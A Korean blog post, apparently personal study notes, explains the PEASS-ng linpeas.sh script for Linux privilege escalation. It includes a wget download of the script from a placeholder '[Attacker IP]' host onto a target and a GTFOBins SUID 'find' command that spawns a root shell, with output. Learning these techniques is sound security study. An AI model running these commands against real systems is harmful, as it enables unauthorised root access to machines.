---
layout: post
title: "PEASS-ng 공부"
date: 2025-09-04 17:00:00 +0900
categories: [시스템 해킹]
---

### 1. 개요

PEASS-ng(Privilege Escalation Awesome Scripts SUITE new generation)는 권한 상승을 위한 정보를 자동으로 수집해 주는 스크립트 모음이다. 이 중 `linpeas.sh`는 리눅스 환경에서 실행되며 시스템의 설정 오류 · 커널 버전 · SUID 파일 · cron 작업 등 권한 상승에 이용될 수 있는 거의 모든 항목을 검사하고 결과를 색상으로 구분하여 보여준다. 수동으로 정보를 수집하는 과정을 자동화하여 분석 시간을 크게 단축시킨다.

---

### 2. 스크립트 실행 방법

`linpeas.sh` 스크립트를 공격 대상 서버로 옮긴 후 실행 권한을 부여하고 실행하는 과정이 필요하다.

#### ***1. 스크립트 전송***
공격자 PC에서 웹 서버를 열고 대상 서버에서 `wget` 이나 `curl` 명령어로 스크립트를 다운로드하는 것이 일반적이다.

*   ***공격자 PC:***
    ```bash
    # linpeas.sh 파일이 있는 디렉터리에서 실행
    python3 -m http.server 8000
    ```
*   ***대상 서버:***
    ```bash
    # 쓰기 가능한 디렉터리(예: /tmp)로 이동
    cd /tmp
    wget http://[Attacker IP]:8000/linpeas.sh
    ```

#### **2. 스크립트 실행**
다운로드한 스크립트에 실행 권한을 부여하고 실행한다.
```bash
chmod +x linpeas.sh
./linpeas.sh
```

---

### 3. 결과 분석

`linpeas.sh`는 실행 결과에서 잠재적인 취약점 항목을 색상으로 강조하여 보여준다.

*   **빨간색 + 노란색 배경:** 95% 확률로 권한 상승에 이용 가능한 매우 중요한 항목.
*   **빨간색:** 흥미롭거나 주의 깊게 봐야 할 항목.
*   **노란색:** 추가적인 정보가 될 수 있는 항목.

   ![Linpeas.sh](/assets/images/Lin_1.png)

결과 보고서를 통해 SUID가 설정된 바이너리, 시스템 권한으로 실행되는 cron 작업 `sudo -l` 로 확인한 권한 등 권한 상승에 결정적인 단서가 될 수 있는 정보들을 한눈에 파악할 수 있다. 예를 들어 `(i) find results` 섹션에서 [GTFOBins](https://gtfobins.github.io/)에 등재된 SUID 파일을 발견했다면 이를 직접적인 공격 경로로 활용할 수 있다.

---

### 4. 사용 예시: SUID 바이너리를 이용한 권한 상승

이 예시는 `linpeas.sh`가 찾아낸 `SUID` 설정 파일을 이용하여 `root` 권한을 획득하는 과정을 보여준다. '정보 수집 -> 분석 -> 공격 실행'의 전체 흐름을 따른다.

#### ***1. 정보 수집 (linpeas.sh)***
**`./linpeas.sh`** 를 실행하여 시스템을 스캔한다. 스캔 결과 중 `SUID/SGID Binaries` 섹션에서 권한 상승에 악용될 수 있는 파일 목록을 확인한다.

아래 예시에서는 **`/usr/bin/find`** 파일이 SUID 비트가 설정되어 있고 **GTFOBins**에 등재되어 있어 권한 상승에 이용 가능하다고 **빨간색+노란색 배경**으로 강조되어 있다.

  ![LinpeasSuid](/assets/images/Lin_2.png)

#### ***2. 분석 (GTFOBins)***
**GTFOBins**는 유닉스 바이너리를 이용한 권한 상승 및 다양한 기능 우회 방법을 모아놓은 리소스이다. `linpeas.sh`가 알려준 **`find`** 바이너리를 GTFOBins 사이트에서 검색한다.

GTFOBins는 `find`의 SUID를 이용하여 쉘을 실행하는 아래의 명령어를 제공한다.
```bash
find . -exec /bin/sh -p \; -quit
```

#### ***3. 공격 실행 (권한 상승)***
획득한 일반 사용자 쉘에서 GTFOBins에서 찾은 명령어를 그대로 실행한다.

```bash
find . -exec /bin/sh -p \; -quit
# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
# whoami
root
```

  ![LinpeasRoot](/assets/images/Lin_3.png)

*   명령어를 실행하면 프롬프트는 그대로지만 **`-p`** 옵션으로 인해 유효 사용자 ID(`euid`)가 `root`로 설정된 쉘이 실행된다.
*   **`id`** 명령어를 실행하면 `euid=0(root)`로 표시되어 권한이 상승했음을 확인할 수 있다.
*   **`whoami`** 명령어 역시 `root`를 반환한다.

이 과정을 통해 `linpeas.sh`로 수집한 정보를 바탕으로 분석하여 실제 `root` 권한을 획득하는 데 성공했다.

<hr class="short-rule">